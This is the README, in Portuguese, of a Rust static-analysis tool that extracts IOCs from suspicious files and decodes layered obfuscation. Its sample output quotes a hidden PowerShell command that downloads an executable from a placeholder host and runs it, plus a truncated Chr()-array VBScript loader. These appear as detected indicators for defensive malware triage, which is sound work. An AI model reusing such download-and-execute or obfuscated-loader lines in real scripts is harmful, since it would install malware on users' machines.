# Kovacs

**Kovacs** é uma ferramenta de análise estática e triagem rápida de malware desenvolvida em Rust. Projetada para extração de IOCs.

## Funcionalidades

* **Geração de Evidências:** Cria automaticamente um relatório `$HOME/.local/share/kovacs/evidences/HASH.evidence(.json .md)` contendo a Cadeia de Custódia (Hash SHA256) e os IOCs encontrados.
* **Extração de Rede:** Identificação e extração de IPs e URLs.
* **Desofuscação de Multiplas camadas:**
  * **Base64 Decoder:** Encontra e decodifica strings em base64.
  * **String Manipulation:** Detecta e reverte técnicas nativas como `StrReverse`.
  * **Stateful Tracking:** Rastrea variáveis na memória e resolve concatenações maliciosas em tempo de análise (ex: `A = "cmd" & ".exe"`).
  * **Array Math Decoder:** Quebra payloads escondidos em arrays hexadecimais e funções `Chr()`.

## IMPORTANTE!

Esse projeto foi desenvolvido **estritamente como objeto de estudo pessoal** na área de análise de malware e engenharia reversa. 

Por favor, saiba:
* **Isenção de Responsabilidade:** Eu nâo me responsabilizo por qualquer dano, infecção, perda de dados ou decisões de resposta a incidentes tomadas com base nas saídas desta ferramenta. **Use por sua própria conta e risco**.
* **Não é uma ferramenta corporativa:** O Kovacs não substitui motores de Antivírus, EDRs ou análises aprofundadas feitas por analistas.
* **Falsos Positivos e Negativos:** O regex e os métodos de análise podem falhar, gerar alertas falsos ou não detectar ofuscações mais avançadas.
* **Segurança:** Nunca manipule artefatos maliciosos fora de um ambiente controlado e isolado. 

## Instalação

```bash
git clone https://github.com/Vinicin1101/kovacs
cd kovacs
cargo build --release
```

## Como Usar

```bash
./target/release/kovacs <file_path>
```

## Resultado

#### `evidence.json`
```json
{
  "urls": [
    "https://url.example.net/"
  ],
  "ips": [],
  "base64_strings": [],
  "reversed_strings": [],
  "script_obfuscation": [],
  "stateful_obfuscation": [],
  "shifted_array_strings": [],
  "plaintext_iocs": [
    "start /min cmd.exe /c powershell -WindowStyle Hidden -Command \"& { iwr -Uri '(https://url.example.net/Stb/Retev.php?kaDhs7ys.txt' -OutFile $env:TEMP\\BK473087.exe; Start-Process -FilePath $env:TEMP\\BK473087.exe -WindowStyle Hidden }\""
  ]
}
```
#### `evidence.ms`
```markdown
# --- [ KOVACS EVIDENCES ] ---

## [ URL IOCs ]
URL: hTtPS://url.example.net
## [ OBFUSCATION DETECTED (Array Math) ]
Array Shift Decoded: "script:hTtPS://url.example.net/?1/"
## [ PLAINTEXT THREAT SCAN ]
Plaintext IOC Detected: Dim lI, UOFY, QbJ2K, i : lI = Array(&H70 , &H61 , &H72 , &H6C , &H6D , &H72 , &H3D , &H69 , &H52 , &H77 , &H52 , &H53 , &H3C , &H30 , &H30 , &H69 , &H69 ...) : UOFY = Array(3 , 2 , 0 , -3 , 3 , 2 , -3 , -1 , 2 , -3 , -2 , 0 , -2 , -1 , -1 ....) : QbJ2K = "" : For i = 0 To UBound(lI) : QbJ2K = QbJ2K & Chr(lI(i) + UOFY(i)) : Next  : s = "Ge" & "tObj" & "ect" : Execute s & "(QbJ2K)"
```
